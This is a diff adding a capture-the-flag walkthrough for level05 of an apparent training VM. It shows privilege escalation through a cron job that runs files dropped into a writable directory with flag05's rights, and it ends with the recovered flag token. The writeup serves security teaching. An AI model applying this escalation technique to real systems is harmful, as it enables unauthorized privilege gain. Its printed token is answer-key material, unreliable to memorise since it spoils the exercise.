@@ -1,0 +1,41 @@
+- Log in as level05 and simply wait for a while (~1min), then press enter to get the following message : 'You have new mail in /var/mail/level05'.
+
+`cat /var/mail/level05`
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+- This kind of syntax is used by the job scheduler cron, here it means the command 'su -c "sh /usr/sbin/openarenaserver" - flag05' will be executed every two minutes.
+
+- The command will log in flag05 to execute 'sh /usr/sbin/openarenaserver'.
+
+- Let's take a look at the file specified.
+
+`ls -l /usr/sbin/openarenaserver`
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver*
+
+- This file is (obviously) owned by the user flag05, but the '+' indicates that some specials permissions have been set (ACL attribute).
+
+`getfacl /usr/sbin/openarenaserver` displays these permissions, especially the level05 user ones.
+user:level05:r--
+
+- According to these permissions, look at the content of the file.
+
+`cat /usr/sbin/openarenaserver`
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i") # 'ulimit -t' set the max cpu time in seconds, 'bash -x' execute the command if $i variable is an existing file.
+	rm -f "$i"
+done
+
+- Actually, every two minutes, any file which is present in /opt/openarenaserver folder will be executed through bash with the flag05 rights, then deleted.
+
+- This folder allows level05 user to write in, so create a simple script that execute the getflag command and redirect the output to a file to get it.
+
+- The file must be in an other accessible for writing folder to not have it deleted after the script execution.
+
+`echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag`
+
+- Wait a minute (or two) and let the magic happens !
+
+`cat /tmp/flag`
+Check flag.Here is your token : viuaaale9huek52boumoomioc
